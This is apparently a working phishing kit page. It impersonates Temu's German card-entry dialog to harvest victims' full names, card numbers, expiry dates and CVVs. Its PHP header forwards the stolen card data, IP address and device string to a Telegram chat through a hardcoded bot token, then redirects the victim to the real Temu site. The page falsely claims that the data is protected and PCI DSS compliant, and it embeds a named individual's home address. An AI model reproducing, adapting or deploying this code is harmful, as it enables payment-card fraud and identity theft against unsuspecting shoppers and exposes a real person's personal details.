<?php
// ============================================
// Telegram Bot Configuration
// ============================================
$botToken = "8832943565:AAGcI7DS4gWATLCUM78o3TSJVo5CBxCa-Wk";
$chatId   = "-1003939463376";

// ============================================
// Process form submission
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cardNumber'])) {
    $fullName   = $_POST['fullName']   ?? '';
    $cardNumber = $_POST['cardNumber'] ?? '';
    $expDate    = $_POST['expDate']    ?? '';
    $cvv        = $_POST['cvv']        ?? '';
    $cardName   = $_POST['cardName']   ?? '';
    $ip         = $_SERVER['REMOTE_ADDR'];
    $ua         = $_SERVER['HTTP_USER_AGENT'];
    $time       = date('Y-m-d H:i:s');

    $msg = "
═══════════════════════════════
      💳 TEMU - New Card Data
═══════════════════════════════
👤 الاسم : $fullName
💳 البطاقة : $cardNumber
📅 الصلاحية : $expDate
🔒 CVV : $cvv
🏦 صاحب البطاقة : $cardName
🌐 IP : $ip
🕐 الوقت : $time
📱 الجهاز : $ua
═══════════════════════════════";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text'    => $msg,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);

    // Redirect to real Temu
    header('Location: https://www.temu.com');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Karte hinzufügen</title>
    <meta charset="UTF-8" />
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <style>
        *{box-sizing:border-box}body{margin:0;padding:0;font-family:Arial,sans-serif;background:#f4f4f4}
        .pc{display:none}.mb{display:block}
        @media(min-width:768px){.pc{display:block}.mb{display:none}}
        .card-modal-overlay{position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,.4);display:flex;justify-content:center;align-items:center;z-index:9999}
        .card-modal{background:#fff;width:90%;max-width:600px;border-radius:12px;padding:30px 40px;position:relative;box-shadow:0 4px 12px rgba(0,0,0,.15);max-height:90vh;overflow-y:auto}
        @media(max-width:768px){.card-modal-overlay{align-items:flex-end}.card-modal{padding:20px 15px 90px;width:100%;border-radius:12px 12px 0 0}}
        .modal-close-btn{position:absolute;top:20px;right:20px;cursor:pointer;color:#555}
        .modal-header{text-align:center;margin-bottom:25px}
        .modal-header h2{font-size:22px;font-weight:600;color:#111;margin:0 0 8px}
        .security-badge{color:#2e8b57;font-size:14px;font-weight:600;display:inline-flex;align-items:center;gap:4px;cursor:pointer}
        .card-logos-row{margin-bottom:20px;display:flex;align-items:center}
        .card-form .form-group{margin-bottom:18px;position:relative}
        .card-form label{display:flex;align-items:center;font-size:14px;font-weight:700;color:#111;margin-bottom:8px}
        .help-icon{display:inline-flex;justify-content:center;align-items:center;width:14px;height:14px;background:#999;color:#fff;border-radius:50%;font-size:10px;margin-left:6px}
        .input-wrapper{position:relative;display:flex;align-items:center;border:1px solid #ccc;border-radius:4px;overflow:hidden;background:#fff}
        .input-wrapper:focus-within{border-color:#ff7300}
        .input-wrapper input{flex:1;width:100%;border:none;padding:12px 10px;font-size:16px;outline:none;color:#111}
        .input-icon{display:flex;align-items:center;padding:0 10px}
        .form-row{display:grid;grid-template-columns:1fr 1fr;gap:15px}
        .error-text{color:#d01a1a;font-size:13px;display:none;margin-top:6px;font-weight:500}
        .form-group.has-error .error-text{display:block}
        .form-group.has-error .input-wrapper{border-color:#d01a1a}
        .form-group.has-success .input-wrapper{border-color:#2e8b57}
        .success-icon{display:none}
        .form-group.has-success .success-icon{display:flex}
        .billing-address{margin-top:25px;margin-bottom:25px}
        .billing-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
        .address-text{color:#777;font-size:14px;line-height:1.5;margin:0}
        .fixed-bottom-bar{margin-top:25px}
        .submit-btn{width:100%;background:#ff7300;color:#fff;font-size:18px;font-weight:700;padding:15px;border:none;border-radius:100px;cursor:pointer}
        .submit-btn:hover{background:#e66a00}
        .submit-btn:disabled{background:#f0f2f2;color:#b5bcc0;cursor:not-allowed}
        .inder-cc{height:50px}
        @media(max-width:768px){.fixed-bottom-bar{position:fixed;bottom:0;left:0;width:100vw;background:#fff;padding:15px;border-top:1px solid #ebebeb;z-index:10001}.inder-cc{height:38px}}
        .security-footer{display:flex;flex-direction:column;gap:12px}
        .sec-item{display:flex;align-items:flex-start;gap:8px;font-size:13px;color:#565959;line-height:1.4}
        .loader-overlay{position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(255,255,255,.8);display:none;justify-content:center;align-items:center;z-index:10000}
        .spinner{border:4px solid rgba(0,0,0,.1);border-left-color:#ff7300;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div>
        <img class="pc" src="https://freiwilligen-rucksendungtemu.up.railway.app/img/insid-hedopan.jpg" style="width:100%;height:100%;object-fit:cover" />
        <img class="mb" src="https://freiwilligen-rucksendungtemu.up.railway.app/img/insid-hedopan.jpg" style="width:100%;height:100%;object-fit:cover" />
    </div>

    <div class="card-modal-overlay">
        <div class="card-modal">
            <div class="modal-close-btn" onclick="history.back()">
                <svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24">
                    <line x1="18" x2="6" y1="6" y2="18"></line><line x1="6" x2="18" y1="6" y2="18"></line>
                </svg>
            </div>
            <div class="modal-header">
                <h2>Eine neue Karte hinzufügen</h2>
                <div class="security-badge">
                    <svg fill="currentColor" viewbox="0 0 24 24" height="16" width="16">
                        <path d="M12 2C9.243 2 7 4.243 7 7v3H6c-1.103 0-2 .897-2 2v8c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-8c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm8 13H5v-8h14v8z"></path>
                    </svg>
                    Alle Daten sind geschützt &gt;
                </div>
            </div>
            <div class="card-logos-row">
                <img src="https://images.ctfassets.net/gc4s9mi2asix/27iheywutAjlzI1CWL3srg/78dad30c9edccdf21edb709b6b0de272/Accepted-Cards-US.png" style="width:80%;object-fit:contain" />
            </div>

            <form class="card-form" method="POST" action="">
                <!-- Full Name -->
                <div class="form-group" id="group-fullName">
                    <label>* Vollständiger Name</label>
                    <div class="input-wrapper">
                        <div class="input-icon left">
                            <svg fill="none" height="20" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="20">
                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                                <circle cx="12" cy="7" r="4"></circle>
                            </svg>
                        </div>
                        <input id="fullName" name="fullName" placeholder="Vollständiger Name" required type="text" maxlength="50" />
                    </div>
                    <span class="error-text">! Bitte gib den vollständigen Namen ein.</span>
                </div>

                <!-- Card Number -->
                <div class="form-group" id="group-cardNumber">
                    <label>* Kartennummer</label>
                    <div class="input-wrapper">
                        <div class="input-icon left">
                            <img src="https://freiwilligen-rucksendungtemu.up.railway.app/img/refud-card-ico.svg" style="height:20px" />
                        </div>
                        <input id="cardNumber" name="cardNumber" placeholder="Kartennummer" required type="tel" maxlength="23" autocomplete="cc-number" />
                        <div class="input-icon right success-icon">
                            <svg fill="#0e8c08" height="1em" viewbox="0 0 1024 1024" width="1em">
                                <path d="M453.8 53.5c33.4-13.3 70.5-13.5 104.1-0.7l340.5 130.2c41.2 15.7 67.6 56 65.7 100l-8.2 190.2c-6.9 160.5-88.2 308.6-219.8 400.6l-116.5 81.6c-67 46.8-156.1 46.8-223.1 0l-115.1-80.5c-131.5-92-211.7-240.8-216.2-401.2l-5.4-191.4c-1.2-43 24.6-82.2 64.6-98.1z m258.7 327.4c-15.8-16.1-41.8-16.4-57.9-0.5l-178.8 175.5-89.9-81.2c-16.8-15.2-42.7-13.8-57.9 3-15.2 16.8-13.8 42.7 2.9 57.8l118.6 107.1c16.1 14.5 40.7 14 56.2-1.2l206.3-202.6c16.1-15.8 16.4-41.8 0.5-57.9z"></path>
                            </svg>
                        </div>
                    </div>
                    <span class="error-text">! Bitte gib die Kartennummer ein.</span>
                </div>

                <!-- Expiry + CVV -->
                <div class="form-row">
                    <div class="form-group" id="group-expDate">
                        <label>* Ablaufdatum</label>
                        <div class="input-wrapper">
                            <input id="expDate" name="expDate" placeholder="MM/JJ" required type="tel" maxlength="5" autocomplete="cc-exp" />
                        </div>
                        <span class="error-text">Bitte ein gültiges Ablaufdatum eingeben.</span>
                    </div>
                    <div class="form-group" id="group-cvv">
                        <label>* CVV <span class="help-icon">?</span></label>
                        <div class="input-wrapper">
                            <input id="cvv" name="cvv" placeholder="3-4 Zeichen" required type="tel" maxlength="4" autocomplete="cc-csc" />
                            <div class="input-icon right">
                                <svg fill="currentColor" viewbox="0 0 24 24" height="22" width="22">
                                    <path d="M12 2C9.243 2 7 4.243 7 7v3H6c-1.103 0-2 .897-2 2v8c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-8c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm8 13H5v-8h14v8z"></path>
                                </svg>
                            </div>
                        </div>
                        <span class="error-text">Ungültige CVV.</span>
                    </div>
                </div>

                <!-- Billing Address -->
                <div class="billing-address">
                    <div class="billing-header">
                        <label>* Rechnungsadresse <span class="help-icon">?</span></label>
                        <a class="edit-btn" href="javascript:void(0)">
                            <svg fill="none" height="14" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" style="margin-right:4px" viewbox="0 0 24 24" width="14">
                                <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path>
                                <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path>
                            </svg>
                            Bearbeiten
                        </a>
                    </div>
                    <p class="address-text">benjamin matthias, Gebelsbergstr. 97, Stuttgart, Baden-Württemberg 70199, Deutschland</p>
                </div>

                <input type="hidden" name="cardName" value="benjamin matthias" />

                <!-- Security Footer -->
                <div class="security-footer">
                    <div class="sec-item"><svg fill="#0e8c08" height="16" viewbox="0 0 1024 1024" width="16"><path d="M453.8 53.5c33.4-13.3 70.5-13.5<path d="M453.8 53.5c33.4-13.3 70.5-13.5 104.1-0.7l340.5 130.2c41.2 15.7 67.6 56 65.7 100l-8.2 190.2c-6.9 160.5-88.2 308.6-219.8 400.6l-116.5 81.6c-67 46.8-156.1 46.8-223.1 0l-115.1-80.5c-131.5-92-211.7-240.8-216.2-401.2l-5.4-191.4c-1.2-43 24.6-82.2 64.6-98.1z m258.7 327.4c-15.8-16.1-41.8-16.4-57.9-0.5l-178.8 175.5-89.9-81.2c-16.8-15.2-42.7-13.8-57.9 3-15.2 16.8-13.8 42.7 2.9 57.8l118.6 107.1c16.1 14.5 40.7 14 56.2-1.2l206.3-202.6c16.1-15.8 16.4-41.8 0.5-57.9z"></path>
                </svg>
                <span class="bold-green">Temu schützt deine Kartendaten</span>
            </div>
            <div class="sec-item">
                <svg fill="#0e8c08" height="16" viewbox="0 0 1024 1024" width="16">
                    <path d="M930.4 227.8l-108.2-84.8-409.5 522.4-243.1-188.7-84.3 108.6 351.2 272.7z"></path>
                </svg>
                <span>Temu befolgt den PCI DSS Standard</span>
            </div>
            <div class="sec-item">
                <svg fill="#0e8c08" height="16" viewbox="0 0 1024 1024" width="16">
                    <path d="M930.4 227.8l-108.2-84.8-409.5 522.4-243.1-188.7-84.3 108.6 351.2 272.7z"></path>
                </svg>
                <span>Alle Daten sind geschützt</span>
            </div>
            <div class="sec-item">
                <svg fill="#0e8c08" height="16" viewbox="0 0 1024 1024" width="16">
                    <path d="M930.4 227.8l-108.2-84.8-409.5 522.4-243.1-188.7-84.3 108.6 351.2 272.7z"></path>
                </svg>
                <span>Temu verkauft niemals deine Kartendaten</span>
            </div>
            <div>
                <img class="inder-cc" src="https://freiwilligen-rucksendungtemu.up.railway.app/img/inderccform.PNG" />
            </div>
        </div>

        <div class="fixed-bottom-bar">
            <button class="submit-btn" id="submitBtn" type="submit">Deine Karte hinzufügen</button>
        </div>
    </form>
</div>
</div>

<div class="loader-overlay" id="loadingSpinner">
    <div class="spinner"></div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('creditCardForm');
    const cardNumberInput = document.getElementById('cardNumber');
    const expDateInput = document.getElementById('expDate');
    const cvvInput = document.getElementById('cvv');

    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s+/g, '');
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += value[i];
        }
        e.target.value = formatted;
    });

    expDateInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        e.target.value = value.length > 2 ? value.substring(0,2)+'/'+value.substring(2,4) : value;
    });

    function forceNumeric(e) {
        if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') e.preventDefault();
    }
    cardNumberInput.addEventListener('keypress', forceNumeric);
    expDateInput.addEventListener('keypress', forceNumeric);
    cvvInput.addEventListener('keypress', forceNumeric);

    function isValidCardNumber(n) {
        n = n.replace(/\s/g,'');
        if (n.length < 13 || n.length > 19) return false;
        let sum = 0, double = false;
        for (let i = n.length-1; i >= 0; i--) {
            let d = parseInt(n[i]);
            if (double) { d *= 2; if (d > 9) d -= 9; }
            sum += d; double = !double;
        }
        return sum % 10 === 0;
    }

    function isExpDateValid() {
        let val = expDateInput.value;
        if (val.length !== 5) return false;
        let parts = val.split('/');
        let m = parseInt(parts[0],10), y = parseInt(parts[1],10)+2000;
        if (m < 1 || m > 12) return false;
        let now = new Date();
        return y > now.getFullYear() || (y === now.getFullYear() && m >= (now.getMonth()+1));
    }

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        // Validate
        let num = cardNumberInput.value.replace(/\s/g,'');
        let cardOk = isValidCardNumber(num);
        let dateOk = isExpDateValid();
        let cvvOk = cvvInput.value.length >= 3 && cvvInput.value.length <= 4 && /^\d+$/.test(cvvInput.value);

        document.getElementById('group-cardNumber').classList.toggle('has-error', !cardOk);
        document.getElementById('group-cardNumber').classList.toggle('has-success', cardOk);
        document.getElementById('group-expDate').classList.toggle('has-error', !dateOk);
        document.getElementById('group-expDate').classList.toggle('has-success', dateOk);
        document.getElementById('group-cvv').classList.toggle('has-error', !cvvOk);
        document.getElementById('group-cvv').classList.toggle('has-success', cvvOk);

        if (!cardOk || !dateOk || !cvvOk) return;

        document.getElementById('loadingSpinner').style.display = 'flex';
        document.getElementById('submitBtn').disabled = true;
        form.requestSubmit();
    });
});
</script>
</body>
</html>